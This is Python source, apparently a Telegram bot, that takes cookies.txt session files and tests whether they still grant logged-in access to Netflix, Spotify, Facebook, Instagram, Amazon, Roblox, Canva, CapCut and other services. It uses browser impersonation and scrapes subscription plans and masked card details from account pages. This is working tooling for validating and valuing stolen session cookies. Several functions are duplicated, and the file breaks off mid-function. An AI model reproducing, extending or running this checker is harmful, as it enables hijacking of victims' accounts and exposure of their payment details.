import os
import logging
import asyncio
import json
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from telegram.error import TimedOut, RetryAfter
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import re
from pathlib import Path
import zipfile
from io import BytesIO
import sys
import time, uuid
import random
import string

try:
    from loader import OutlookChecker
except ImportError:
    from hotmail import OutlookChecker


def _split_cookie_path(file_path):
    p = Path(file_path)
    return p.parent.name, p.name

def _fast_print(msg):
    try:
        sys.stdout.reconfigure(line_buffering=True)
    except Exception:
        pass
    print(msg, flush=True)

try:
    from curl_cffi import requests as crequests
    HAS_CURL_CFFI = True
except ImportError:
    _fast_print("WARNING: curl_cffi not installed. Installing via pip.")
    try:
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "curl_cffi"])
        from curl_cffi import requests as crequests
        HAS_CURL_CFFI = True
        _fast_print("SUCCESS: curl_cffi installed successfully")
    except Exception as e:
        _fast_print(f"ERROR: Failed to install curl_cffi: {e}")
        crequests = requests
        HAS_CURL_CFFI = False

CUSTOM_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

def parse_cookies_txt(content):
    cookies = []
    lines = content.strip().split('\n')
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if line.startswith('#HttpOnly_'):
            line = line[len('#HttpOnly_'):]
        elif line.startswith('#'):
            continue
        parts = line.split('\t')
        if len(parts) < 7:
            continue
        domain, subd_flag, path, secure_flag, expires, name, value = parts[:7]
        cookies.append({
            'domain': domain,
            'path': path,
            'secure': secure_flag.upper() == 'TRUE',
            'expires': expires,
            'name': name,
            'value': value
        })
    return cookies

def filter_cookies_by_domain(cookies, target_domains):
    filtered = []
    for cookie in cookies:
        for target_domain in target_domains:
            if cookie['domain'] == target_domain or cookie['domain'].endswith(target_domain):
                filtered.append(cookie)
                break
    return filtered

def get_status_icon(status):
    if status == 'success':
        return "?"
    elif status == 'dead':
        return "?"
    else:
        return ""

def get_status_text(status):
    if status == 'success':
        return "Valid cookie."
    elif status == 'dead':
        return "Invalid or expired cookie."
    elif status == 'no_cookies':
        return "No cookies found for this service."
    elif status == 'error':
        return "Error while checking cookie."
    else:
        return "Unknown cookie status."

def clean_filename(name):
    name = name.replace("/", "_").replace("\\", "_")
    name = re.sub(r"\s+", "_", name)
    return name[:50]

def extract_public_plan_info(plan_info):
    if not plan_info:
        return ""
    plan_match = re.search(r"Plan:\s*([A-Za-z0-9 \-\(\)]+)", plan_info)
    if plan_match:
        return f"Plan: {plan_match.group(1).strip()}"
    generic_match = re.search(r"Status:\s*([A-Za-z0-9 \-\(\)]+)", plan_info)
    if generic_match:
        return f"Status: {generic_match.group(1).strip()}"
    return ""

def test_cookies_with_target(cookies, target_url, contains_text):
    try:
        if HAS_CURL_CFFI:
            session = crequests.Session(impersonate="chrome")
        else:
            session = requests.Session()

        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            cookie_name = str(cookie['name'])[:100]
            cookie_value = str(cookie['value'])[:4000]
            session.cookies.set(cookie_name, cookie_value, domain=domain, path=cookie['path'], secure=cookie['secure'])

        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept-Language': 'en-US,en;q=0.9'
        }

        if 'roblox.com' in target_url:
            return test_roblox_login(cookies)
        if 'instagram.com' in target_url:
            return test_instagram_login(cookies)
        if 'youtube.com' in target_url:
            return test_youtube_login(cookies)
        if 'linkedin.com' in target_url:
            return test_linkedin_login(cookies)
        if 'amazon.com' in target_url:
            return test_amazon_login(cookies)
        if 'wordpress.com' in target_url:
            return test_wordpress_login(cookies)
        if 'capcut.com' in target_url:
            return test_capcut_login(cookies)

        session.headers.update(headers)
        response = session.get(target_url, timeout=20, allow_redirects=True)
        final_url = response.url
        status_code = response.status_code
        text = response.text

        if status_code == 200 and contains_text.lower() in text.lower():
            plan_info = ""
            if "netflix.com" in target_url:
                plan_info = extract_netflix_plan(text)
            if "canva.com" in target_url:
                plan_info = extract_canva_plan(text)
            return {
                'status': 'success',
                'message': 'Cookie LIVE',
                'final_url': final_url,
                'status_code': status_code,
                'plan_info': plan_info
            }
        else:
            if "login" in final_url.lower() or "signin" in final_url.lower():
                return {
                    'status': 'dead',
                    'message': 'Cookie DEAD - Redirect to login',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': 'Status: DEAD'
                }
            return {
                'status': 'dead',
                'message': 'Cookie DEAD or no access to target',
                'final_url': final_url,
                'status_code': status_code,
                'plan_info': 'Status: DEAD'
            }
    except Exception as e:
        return {
            'status': 'error',
            'message': f'Error testing cookies: {str(e)}',
            'final_url': None,
            'status_code': None,
            'plan_info': 'Status: Error'
        }

def extract_netflix_plan(html_content):
    try:
        exact_plan_patterns = [
            r'<h3[^>]*data-uia="account-membership-page\+plan-card\+title"[^>]*class="[^"]*"[^>]*>([^<]+)</h3>',
            r'<h3[^>]*class="[^"]*"[^>]*>([^<]+)</h3>',
            r'<div[^>]*class="[^"]*default-ltr-cache-1rvukw7[^"]*"[^>]*>.*?<h3[^>]*>([^<]+)</h3>'
        ]
        for pattern in exact_plan_patterns:
            exact_match = re.search(pattern, html_content, re.DOTALL | re.IGNORECASE)
            if exact_match:
                plan_name = exact_match.group(1).strip()
                if len(plan_name) < 50 and not re.search(r'\d', plan_name):
                    return f"Plan: {plan_name}"
        membership_div_patterns = [
            r'<div[^>]*class="[^"]*default-ltr-cache-1rvukw7[^"]*"[^>]*>.*?<h3[^>]*>([^<]+)</h3>',
            r'<div[^>]*class="[^"]*e1devdx33[^"]*"[^>]*>.*?<h3[^>]*>([^<]+)</h3>'
        ]
        for pattern in membership_div_patterns:
            match = re.search(pattern, html_content, re.DOTALL | re.IGNORECASE)
            if match:
                plan_name = match.group(1).strip()
                if len(plan_name) < 50 and not re.search(r'\d', plan_name):
                    return f"Plan: {plan_name}"
        return "Plan: Unknown"
    except Exception as e:
        return f"Plan: Error when checking - {str(e)}"

def extract_tiktok_username(html_content):
    try:
        pattern = r'"uniqueId":"([^"]+)"'
        matches = re.findall(pattern, html_content)
        if matches:
            return matches[0]
        pattern_h1 = r'<h1[^>]*>([^<]+)</h1>'
        match_h1 = re.search(pattern_h1, html_content)
        if match_h1:
            username = match_h1.group(1).strip()
            if username and len(username) < 50:
                return username
        return "Unknown"
    except Exception as e:
        return "Unknown"

def extract_payment_info(html_content):
    try:
        masked_card_patterns = [
            r'(\b(?:\d{4}\s*[-•*·]{1,3}\s*){3}\d{4}\b)',
            r'(\b(?:\d{4}\s+){3}\d{4}\b)',
            r'((?:Card|Visa|Mastercard|Master Card|American Express|Amex|Discover|PayPal|Apple Pay|Google Pay|Stripe|UnionPay)[^<]{0,30}\d{2,4}[-•*·]{2,10}\d{2,4})',
            r'(\d{4}\s*[•*·]{2,10}\s*\d{4})',
            r'(\b(?:\d{4}\s*){3}\d{4}\b)',
            r'(\b(?:\d{4}\s*[-•*·]{1,3}\s*){3}\d{4}\b)',
            r'(\b(?:\d{4}\s+){3}\d{4}\b)',
            r'((?:Card|Visa|Mastercard|Master Card|American Express|Amex|Discover|PayPal|Apple Pay|Google Pay|Stripe|UnionPay)\s*[•*·]{0,10}\s*\d{4})',
            r'(\d+(?:&nbsp;|\s)+[A-Z]{2,4}\$[^<]{0,15})',
            r'(\d+(?:&nbsp;|\s)*[^<]{0,10}/(?:month|year|tháng|n?m|mese|año)[^<]{0,10})',
        ]

        all_payment_info = []

        for pattern in masked_card_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE | re.DOTALL)
            for match in matches:
                payment_info = match.strip()

                payment_info = payment_info.replace('&nbsp;', ' ').replace('&amp;', '&').replace('&lt;', '<').replace('&gt;', '>')

                if payment_info and len(payment_info) > 2:
                    is_duplicate = False
                    for existing in all_payment_info:
                        if payment_info in existing or existing in payment_info:
                            if len(payment_info) > len(existing):
                                all_payment_info.remove(existing)
                                all_payment_info.append(payment_info)
                            is_duplicate = True
                            break
                    if not is_duplicate:
                        all_payment_info.append(payment_info)

        if all_payment_info:
            return f" | {' · '.join(all_payment_info)}"

        return ""

    except Exception as e:
        return ""

def extract_canva_plan(html_content):
    try:
        plan_patterns = [
            r'Canva\s+Pro',
            r'Canva\s+Teams?',
            r'Canva\s+Business',
            r'Canva\s+Enterprise',
            r'Canva\s+??i\s+nhóm',
            r'Canva\s+Doanh\s+nghi?p',
            r'Canva\s+Gratis',
            r'Canva\s+Free',
            r'Canva\s+Mi?n\s+phí',
        ]
        for pattern in plan_patterns:
            match = re.search(pattern, html_content, re.IGNORECASE)
            if match:
                return f"Plan: {match.group(0)}"
        generic_patterns = [
            r'Plan:\s*([A-Za-z0-9 \-\(\)]+)',
            r'Subscription:\s*([A-Za-z0-9 \-\(\)]+)'
        ]
        for pattern in generic_patterns:
            match = re.search(pattern, html_content, re.IGNORECASE)
            if match:
                return f"Plan: {match.group(1).strip()}"
        return "Plan: Unknown"
    except Exception as e:
        return f"Plan: Error when checking - {str(e)}"

def test_netflix_login(cookies):
    return test_cookies_with_target(cookies, "https://www.netflix.com/account", "Account")

def test_spotify_login(cookies):
    return test_cookies_with_target(cookies, "https://www.spotify.com/account/overview/", "Overview")

def test_tiktok_login(cookies):
    return test_cookies_with_target(cookies, "https://www.tiktok.com/setting", "Settings")

def test_roblox_login(cookies):
    try:
        session = crequests.Session(impersonate="chrome") if HAS_CURL_CFFI else requests.Session()
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            cookie_name = str(cookie['name'])[:100]
            cookie_value = str(cookie['value'])[:4000]
            session.cookies.set(cookie_name, cookie_value, domain=domain, path=cookie['path'], secure=cookie['secure'])

        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept-Language': 'vi-VN,vi;q=0.9,en;q=0.8',
            'Referer': 'https://www.roblox.com/'
        }

        target_url = "https://www.roblox.com/vi/home"
        response = session.get(target_url, headers=headers, timeout=30, allow_redirects=True)

        final_url = response.url
        status_code = response.status_code

        if status_code == 200:
            if '/vi/home' in final_url:
                return {
                    'status': 'success',
                    'message': 'Cookie LIVE - Logged into Roblox home page',
                    'final_url': final_url,
                    'status_code': status_code
                }
            else:
                return {
                    'status': 'dead',
                    'message': 'Cookie DEAD - Unexpected redirect',
                    'final_url': final_url,
                    'status_code': status_code
                }

        elif status_code in [301, 302, 303, 307, 308]:
            if 'login' in final_url.lower():
                return {
                    'status': 'dead',
                    'message': 'Cookie DEAD - Redirected to login page',
                    'final_url': final_url,
                    'status_code': status_code
                }
            else:
                return {
                    'status': 'unknown',
                    'message': f'Unexpected redirect (Status: {status_code})',
                    'final_url': final_url,
                    'status_code': status_code
                }
        else:
            return {
                'status': 'dead',
                'message': f'Cookie DEAD - HTTP {status_code}',
                'final_url': final_url,
                'status_code': status_code
            }
    except Exception as e:
        return {
            'status': 'error',
            'message': f'Error testing Roblox login: {str(e)}'
        }

def test_facebook_login(cookies):
    try:
        session = crequests.Session(impersonate="chrome") if HAS_CURL_CFFI else requests.Session()
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            cookie_name = str(cookie['name'])[:100]
            cookie_value = str(cookie['value'])[:4000]
            session.cookies.set(cookie_name, cookie_value, domain=domain, path=cookie['path'], secure=cookie['secure'])

        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.facebook.com/'
        }

        target_url = "https://www.facebook.com/settings"
        response = session.get(target_url, headers=headers, timeout=20, allow_redirects=True)
        final_url = str(response.url)
        status_code = response.status_code
        html_content = response.text

        if "checkpoint" in final_url.lower() or "checkpoint" in html_content.lower():
            return {'status': 'dead','message': 'Cookie DEAD - Checkpoint','final_url': final_url,'status_code': status_code}

        if status_code == 200:
            if 'settings' in final_url.lower() or 'account settings' in html_content.lower():
                return {'status': 'success','message': 'Cookie LIVE','final_url': final_url,'status_code': status_code}
            else:
                return {'status': 'dead','message': 'Cookie DEAD','final_url': final_url,'status_code': status_code}
        else:
            return {'status': 'dead','message': f'Cookie DEAD - HTTP {status_code}','final_url': final_url,'status_code': status_code}
    except Exception as e:
        return {'status': 'error','message': f'Error testing Facebook: {str(e)}'}

def test_instagram_login(cookies):
    try:
        session = crequests.Session(impersonate="chrome") if HAS_CURL_CFFI else requests.Session()
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            cookie_name = str(cookie['name'])[:100]
            cookie_value = str(cookie['value'])[:4000]
            session.cookies.set(cookie_name, cookie_value, domain=domain, path=cookie['path'], secure=cookie['secure'])

        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.instagram.com/'
        }

        target_url = "https://www.instagram.com/accounts/edit/"
        response = session.get(target_url, headers=headers, timeout=20, allow_redirects=True)
        final_url = str(response.url)
        status_code = response.status_code

        if status_code == 200:
            if '/accounts/edit/' in final_url:
                return {'status': 'success','message': 'Cookie LIVE','final_url': final_url,'status_code': status_code,'plan_info': 'Status: LIVE'}
            else:
                return {'status': 'dead','message': 'Cookie DEAD','final_url': final_url,'status_code': status_code,'plan_info': 'Status: DEAD'}
        else:
            return {'status': 'dead','message': f'Cookie DEAD - HTTP {status_code}','final_url': final_url,'status_code': status_code,'plan_info': 'Status: DEAD'}
    except Exception as e:
        return {'status': 'error','message': f'Error testing Instagram: {str(e)}','plan_info': 'Status: Error'}

def extract_netflix_plan(html_content):
    try:
        exact_plan_patterns = [
            r'<h3[^>]*data-uia="account-membership-page\+plan-card\+title"[^>]*class="[^"]*"[^>]*>([^<]+)</h3>',
            r'<h3[^>]*class="[^"]*"[^>]*>([^<]+)</h3>',
            r'<div[^>]*class="[^"]*default-ltr-cache-1rvukw7[^"]*"[^>]*>.*?<h3[^>]*>([^<]+)</h3>'
        ]
        for pattern in exact_plan_patterns:
            exact_match = re.search(pattern, html_content, re.DOTALL | re.IGNORECASE)
            if exact_match:
                plan_name = exact_match.group(1).strip()
                if len(plan_name) < 50 and not re.search(r'\d', plan_name):
                    return f"Plan: {plan_name}"
        membership_div_patterns = [
            r'<div[^>]*class="[^"]*default-ltr-cache-1rvukw7[^"]*"[^>]*>.*?<h3[^>]*>([^<]+)</h3>',
            r'<div[^>]*class="[^"]*e1devdx33[^"]*"[^>]*>.*?<h3[^>]*>([^<]+)</h3>'
        ]
        for pattern in membership_div_patterns:
            match = re.search(pattern, html_content, re.DOTALL | re.IGNORECASE)
            if match:
                plan_name = match.group(1).strip()
                if len(plan_name) < 50 and not re.search(r'\d', plan_name):
                    return f"Plan: {plan_name}"
        return "Plan: Unknown"
    except Exception as e:
        return f"Plan: Error when checking - {str(e)}"

def extract_tiktok_username(html_content):
    try:
        pattern = r'"uniqueId":"([^"]+)"'
        matches = re.findall(pattern, html_content)
        if matches:
            return matches[0]
        pattern_h1 = r'<h1[^>]*>([^<]+)</h1>'
        match_h1 = re.search(pattern_h1, html_content)
        if match_h1:
            username = match_h1.group(1).strip()
            if username and len(username) < 50:
                return username
        return "Unknown"
    except Exception as e:
        return "Unknown"

def extract_payment_info(html_content):
    try:
        auto_payment_patterns = [
            r'(\b(?:\d{4}\s*[-•*·]{1,3}\s*){3}\d{4}\b)',
            r'(\b(?:\d{4}\s+){3}\d{4}\b)',
            r'((?:Card|Visa|Mastercard|Master Card|American Express|Amex|Discover|PayPal|Apple Pay|Google Pay|Stripe|UnionPay)[^<]{0,30}\d{2,4}[-•*·]{2,10}\d{2,4})',
            r'(\d{4}\s*[•*·]{2,10}\s*\d{4})',
            r'(\b(?:\d{4}\s*){3}\d{4}\b)',
            r'(\b(?:\d{4}\s*[-•*·]{1,3}\s*){3}\d{4}\b)',
            r'(\b(?:\d{4}\s+){3}\d{4}\b)',
            r'((?:Card|Visa|Mastercard|Master Card|American Express|Amex|Discover|PayPal|Apple Pay|Google Pay|Stripe|UnionPay)\s*[•*·]{0,10}\s*\d{4})',
            r'(\d+(?:&nbsp;|\s)+[A-Z]{2,4}\$[^<]{0,15})',
            r'(\d+(?:&nbsp;|\s)*[^<]{0,10}/(?:month|year|tháng|n?m|mese|año)[^<]{0,10})',
        ]
        all_payment_info = []
        for pattern in auto_payment_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE | re.DOTALL)
            for match in matches:
                payment_info = match.strip()
                payment_info = payment_info.replace('&nbsp;', ' ').replace('&amp;', '&').replace('&lt;', '<').replace('&gt;', '>')
                if payment_info and len(payment_info) > 2:
                    is_duplicate = False
                    for existing in all_payment_info:
                        if payment_info in existing or existing in payment_info:
                            if len(payment_info) > len(existing):
                                all_payment_info.remove(existing)
                                all_payment_info.append(payment_info)
                            is_duplicate = True
                            break
                    if not is_duplicate:
                        all_payment_info.append(payment_info)
        if all_payment_info:
            return f" | {' · '.join(all_payment_info)}"
        return ""
    except Exception as e:
        return ""

def extract_canva_plan(html_content):
    try:
        plan_patterns = [
            r'Canva\s+Pro',
            r'Canva\s+Teams?',
            r'Canva\s+Business',
            r'Canva\s+Enterprise',
            r'Canva\s+??i\s+nhóm',
            r'Canva\s+Doanh\s+nghi?p',
            r'Canva\s+Gratis',
            r'Canva\s+Free',
            r'Canva\s+Mi?n\s+phí',
        ]
        for pattern in plan_patterns:
            match = re.search(pattern, html_content, re.IGNORECASE)
            if match:
                return f"Plan: {match.group(0)}"
        generic_patterns = [
            r'Plan:\s*([A-Za-z0-9 \-\(\)]+)',
            r'Subscription:\s*([A-Za-z0-9 \-\(\)]+)'
        ]
        for pattern in generic_patterns:
            match = re.search(pattern, html_content, re.IGNORECASE)
            if match:
                return f"Plan: {match.group(1).strip()}"
        return "Plan: Unknown"
    except Exception as e:
        return f"Plan: Error when checking - {str(e)}"

def test_netflix_login(cookies):
    return test_cookies_with_target(cookies, "https://www.netflix.com/account", "Account")

def test_spotify_login(cookies):
    return test_cookies_with_target(cookies, "https://www.spotify.com/account/overview/", "Overview")

def test_tiktok_login(cookies):
    return test_cookies_with_target(cookies, "https://www.tiktok.com/setting", "Settings")

def test_roblox_login(cookies):
    try:
        session = crequests.Session(impersonate="chrome") if HAS_CURL_CFFI else requests.Session()
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            cookie_name = str(cookie['name'])[:100]
            cookie_value = str(cookie['value'])[:4000]
            session.cookies.set(cookie_name, cookie_value, domain=domain, path=cookie['path'], secure=cookie['secure'])

        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept-Language': 'vi-VN,vi;q=0.9,en;q=0.8',
            'Referer': 'https://www.roblox.com/'
        }

        target_url = "https://www.roblox.com/vi/home"
        response = session.get(target_url, headers=headers, timeout=30, allow_redirects=True)

        final_url = response.url
        status_code = response.status_code

        if status_code == 200:
            if '/vi/home' in final_url:
                return {
                    'status': 'success',
                    'message': 'Cookie LIVE - Logged into Roblox home page',
                    'final_url': final_url,
                    'status_code': status_code
                }
            else:
                return {
                    'status': 'dead',
                    'message': 'Cookie DEAD - Unexpected redirect',
                    'final_url': final_url,
                    'status_code': status_code
                }

        elif status_code in [301, 302, 303, 307, 308]:
            if 'login' in final_url.lower():
                return {
                    'status': 'dead',
                    'message': 'Cookie DEAD - Redirected to login page',
                    'final_url': final_url,
                    'status_code': status_code
                }
            else:
                return {
                    'status': 'unknown',
                    'message': f'Unexpected redirect (Status: {status_code})',
                    'final_url': final_url,
                    'status_code': status_code
                }
        else:
            return {
                'status': 'dead',
                'message': f'Cookie DEAD - HTTP {status_code}',
                'final_url': final_url,
                'status_code': status_code
            }
    except Exception as e:
        return {
            'status': 'error',
            'message': f'Error testing Roblox login: {str(e)}'
        }

def test_facebook_login(cookies):
    try:
        session = crequests.Session(impersonate="chrome") if HAS_CURL_CFFI else requests.Session()
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            cookie_name = str(cookie['name'])[:100]
            cookie_value = str(cookie['value'])[:4000]
            session.cookies.set(cookie_name, cookie_value, domain=domain, path=cookie['path'], secure=cookie['secure'])

        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.facebook.com/'
        }

        target_url = "https://www.facebook.com/settings"
        response = session.get(target_url, headers=headers, timeout=20, allow_redirects=True)
        final_url = str(response.url)
        status_code = response.status_code
        html_content = response.text

        if "checkpoint" in final_url.lower() or "checkpoint" in html_content.lower():
            return {'status': 'dead','message': 'Cookie DEAD - Checkpoint','final_url': final_url,'status_code': status_code}

        if status_code == 200:
            if 'settings' in final_url.lower() or 'account settings' in html_content.lower():
                return {'status': 'success','message': 'Cookie LIVE','final_url': final_url,'status_code': status_code}
            else:
                return {'status': 'dead','message': 'Cookie DEAD','final_url': final_url,'status_code': status_code}
        else:
            return {'status': 'dead','message': f'Cookie DEAD - HTTP {status_code}','final_url': final_url,'status_code': status_code}
    except Exception as e:
        return {'status': 'error','message': f'Error testing Facebook: {str(e)}'}

def test_instagram_login(cookies):
    try:
        session = crequests.Session(impersonate="chrome") if HAS_CURL_CFFI else requests.Session()
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            cookie_name = str(cookie['name'])[:100]
            cookie_value = str(cookie['value'])[:4000]
            session.cookies.set(cookie_name, cookie_value, domain=domain, path=cookie['path'], secure=cookie['secure'])

        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.instagram.com/'
        }

        target_url = "https://www.instagram.com/accounts/edit/"
        response = session.get(target_url, headers=headers, timeout=20, allow_redirects=True)
        final_url = str(response.url)
        status_code = response.status_code

        if status_code == 200:
            if '/accounts/edit/' in final_url:
                return {'status': 'success','message': 'Cookie LIVE','final_url': final_url,'status_code': status_code,'plan_info': 'Status: LIVE'}
            else:
                return {'status': 'dead','message': 'Cookie DEAD','final_url': final_url,'status_code': status_code,'plan_info': 'Status: DEAD'}
        else:
            return {'status': 'dead','message': f'Cookie DEAD - HTTP {status_code}','final_url': final_url,'status_code': status_code,'plan_info': 'Status: DEAD'}
    except Exception as e:
        return {'status': 'error','message': f'Error testing Instagram: {str(e)}','plan_info': 'Status: Error'}

def test_youtube_login(cookies):
    try:
        session = crequests.Session(impersonate="chrome") if HAS_CURL_CFFI else requests.Session()
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            session.cookies.set(cookie['name'],cookie['value'],domain=domain,path=cookie['path'],secure=cookie['secure'])

        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9'
        }

        target_url = "https://www.youtube.com/account"
        response = session.get(target_url, headers=headers, timeout=20, allow_redirects=False)
        status_code = response.status_code
        final_url = str(response.url)

        if status_code in [301, 302, 303, 307, 308]:
            return {'status': 'dead','message': 'Cookie DEAD','final_url': final_url,'status_code': status_code}
        elif status_code == 200:
            return {'status': 'success','message': 'Cookie LIVE','final_url': final_url,'status_code': status_code}
        else:
            return {'status': 'unknown','message': 'Unexpected response','final_url': final_url,'status_code': status_code}
    except Exception as e:
        return {'status': 'error','message': f'Error testing YouTube login: {str(e)}'}

def test_linkedin_login(cookies):
    try:
        session = crequests.Session(impersonate="chrome") if HAS_CURL_CFFI else requests.Session()
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            session.cookies.set(cookie['name'],cookie['value'],domain=domain,path=cookie['path'],secure=cookie['secure'])

        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9'
        }

        target_url = "https://www.linkedin.com/mypreferences/d/categories/account"
        response = session.get(target_url, headers=headers, timeout=20, allow_redirects=False)
        status_code = response.status_code
        final_url = str(response.url)

        if status_code in [301, 302, 303, 307, 308]:
            return {'status': 'dead','message': 'Cookie DEAD','final_url': final_url,'status_code': status_code}
        elif status_code == 200:
            return {'status': 'success','message': 'Cookie LIVE','final_url': final_url,'status_code': status_code}
        else:
            return {'status': 'unknown','message': 'Unexpected response','final_url': final_url,'status_code': status_code}
    except Exception as e:
        return {'status': 'error','message': f'Error testing LinkedIn login: {str(e)}'}

def test_amazon_login(cookies):
    try:
        session = crequests.Session(impersonate="chrome") if HAS_CURL_CFFI else requests.Session()
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            session.cookies.set(cookie['name'],cookie['value'],domain=domain,path=cookie['path'],secure=cookie['secure'])

        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9'
        }

        target_url = "https://www.amazon.com/gp/your-account/order-history"
        response = session.get(target_url, headers=headers, timeout=20, allow_redirects=False)
        status_code = response.status_code
        final_url = str(response.url)

        if status_code in [301, 302, 303, 307, 308]:
            return {'status': 'dead','message': 'Cookie DEAD','final_url': final_url,'status_code': status_code}
        elif status_code == 200:
            return {'status': 'success','message': 'Cookie LIVE','final_url': final_url,'status_code': status_code}
        else:
            return {'status': 'unknown','message': 'Unexpected response','final_url': final_url,'status_code': status_code}
    except Exception as e:
        return {'status': 'error','message': f'Error testing Amazon login: {str(e)}'}

def test_wordpress_login(cookies):
    try:
        session = crequests.Session(impersonate="chrome") if HAS_CURL_CFFI else requests.Session()
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            session.cookies.set(cookie['name'], cookie['value'], domain=domain, path=cookie['path'], secure=cookie['secure'])

        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9'
        }
        session.headers.update(headers)

        target_url = "https://wordpress.com/me/"
        response = session.get(target_url, timeout=20, allow_redirects=True)
        status_code = response.status_code
        final_url = str(response.url)
        html_content = response.text

        if status_code == 200 and ('/me/' in final_url or 'Your Profile' in html_content or 'wordpress.com/me' in final_url):
            return {
                'status': 'success',
                'message': 'Cookie LIVE - Access to WordPress profile page',
                'final_url': final_url,
                'status_code': status_code,
                'plan_info': 'Status: LIVE - WordPress user profile accessible'
            }
        elif status_code in [301, 302, 303, 307, 308]:
            if 'log-in' in final_url.lower() or 'wp-login.php' in final_url.lower():
                return {
                    'status': 'dead',
                    'message': 'Cookie DEAD - Redirected to login page',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': 'Status: DEAD - Redirected to WordPress login'
                }
            else:
                return {
                    'status': 'unknown',
                    'message': f'Unexpected redirect (Status: {status_code})',
                    'final_url': final_url,
                    'status_code': status_code
                }
        else:
            return {
                'status': 'dead',
                'message': f'Cookie DEAD or no access to WordPress profile (Status: {status_code})',
                'final_url': final_url,
                'status_code': status_code,
                'plan_info': 'Status: DEAD - WordPress profile not accessible'
            }

    except Exception as e:
        return {
            'status': 'error',
            'message': f'Error testing WordPress login: {str(e)}',
            'plan_info': 'Status: Error - WordPress login test failed'
        }

def test_canva_login(cookies):
    try:
        session = crequests.Session(impersonate="chrome") if HAS_CURL_CFFI else requests.Session()
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            session.cookies.set(cookie['name'],cookie['value'],domain=domain,path=cookie['path'],secure=cookie['secure'])

        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9'
        }

        target_url = "https://www.canva.com/settings/"
        response = session.get(target_url, headers=headers, timeout=20, allow_redirects=True)
        status_code = response.status_code
        final_url = str(response.url)
        html_content = response.text                            

        if status_code == 200 and 'settings' in final_url.lower():
            plan_info = extract_canva_plan(html_content)
            return {'status': 'success','message': 'Cookie LIVE','final_url': final_url,'status_code': status_code,'plan_info': plan_info}
        elif status_code in [301, 302, 303, 307, 308]:
            if 'login' in final_url.lower() or 'signin' in final_url.lower():
                return {'status': 'dead','message': 'Cookie DEAD - Redirected to login','final_url': final_url,'status_code': status_code,'plan_info': 'Status: DEAD'}
            else:
                return {'status': 'unknown','message': 'Unexpected redirect','final_url': final_url,'status_code': status_code}
        else:
            return {'status': 'dead','message': f'Cookie DEAD - HTTP {status_code}','final_url': final_url,'status_code': status_code,'plan_info': 'Status: DEAD'}
    except Exception as e:
        return {'status': 'error','message': f'Error testing Canva login: {str(e)}','plan_info': 'Status: Error'}

def test_capcut_login(cookies):
    try:
        session = crequests.Session(impersonate="chrome") if HAS_CURL_CFFI else requests.Session()
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            session.cookies.set(cookie['name'],cookie['value'],domain=domain,path=cookie['path'],secure=cookie['secure'])

        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9'
        }

        target_url = "https://www.capcut.com/my-edit"
        response = session.get(target_url, headers=headers, timeout=20, allow_redirects=True)
        status_code = response.status_code
        final_url = str(response.url)
        html_content = response.text

        if final_url == 'https://www.capcut.com' or final_url == 'https://www.capcut.com/':
            return {'status': 'dead','message': 'Cookie DEAD','final_url': final_url,'status_code': status_code}

        plan = 'Unknown'
        pattern = r'subscribe_info["\\\s]*:["\\\s]*\{["\\\s]*flag["\\\s]*:["\\\s]*(true|false)'
        match = re.search(pattern, html_content)
        if match:
            plan = 'Pro' if match.group(1) == 'true' else 'Free'

        if status_code == 200 and ('my-edit' in final_url or '/my-edit' in html_content):
